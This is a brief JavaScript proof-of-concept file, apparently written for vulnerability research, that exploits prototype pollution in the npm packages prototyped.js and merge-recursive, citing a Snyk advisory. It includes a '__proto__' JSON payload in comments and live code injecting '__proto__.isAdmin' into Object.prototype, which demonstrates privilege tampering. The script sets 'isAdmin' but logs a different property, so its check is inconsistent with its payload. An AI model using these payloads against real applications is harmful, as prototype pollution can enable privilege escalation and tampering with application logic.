//https://snyk.io/vuln/SNYK-JS-PROTOTYPEDJS-1069824
 
  // const merge = require("merge-recursive").recursive;
  // const malicious_payload = '{"__proto__":{"polluted":"yes"}}';
  // obj = {};

  //  

  // merge({}, JSON.parse(malicious_payload));

  //  

  const set = require("prototyped.js/dist/object/set").default;
  console.log("Prototype before set", {}.polluted);
  set.__x_toTaint = true;
  set({}, "__proto__.isAdmin", true);
  console.log("Prototype after set", {}.polluted);
// End of file
